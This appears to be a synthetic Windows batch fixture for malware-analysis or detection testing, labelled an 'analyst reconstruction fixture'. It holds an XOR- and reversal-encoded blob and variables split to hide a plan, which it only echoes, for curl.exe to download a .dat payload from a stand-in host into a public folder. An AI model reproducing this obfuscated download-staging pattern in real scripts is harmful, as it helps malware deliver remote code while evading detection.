@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|xor_5a
rem HUNTRESS-MATERIAL:=4yO+QnP782ap9DOuJ2a39TP74SKGgzOWkSK/giL08iEGkzM2gzLKYQKo8TKPYAYZcmMusjKF8jNzwjJusjP0lza5sjbshzY15zM2sDL0MDd/YjK3sjI/QnP782ap9DOuJ2a1VHYpoiLuIzZ2gyLm4zOvtWa/gjbit2d00zM7oyN7kzZ+MTB00zM7oyN7kjJ/QTN0c2P9szL9QzO2UgLi8DNm4yL1UAN7wzZyoyOo0jJrdmL08SN5UwP9sjLpYyPi8Dd2gyL5cGK/4iK74zOm8jNzwTB/4yMo0id/4SN38DKF8DKz8yK5szZpoyPukiJrdGL
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "v_a0=v=1|steps=acquire_remote,write_file|adapter=curl.exe|stage_co"
set "v_a1=unt=1|graph=fan_out|next_language=none|campaign_id=campaign-1"
set "v_a2=84be315ad|url=https://184be315ad.example.invalid/9b64ac1c.dat"
set "v_a3=|file_path=C:\Users\Public\HuntressLab\stage-184be315ad.dat"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_opaque_branch=5592fa79"
goto :HUNTRESS_DISPATCH
:HUNTRESS_DISPATCH
set "cfg=%v_a0%%v_a1%%v_a2%%v_a3%"
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo curl.exe acquire https://184be315ad.example.invalid/9b64ac1c.dat to C:\Users\Public\HuntressLab\stage-184be315ad.dat
exit /b 0
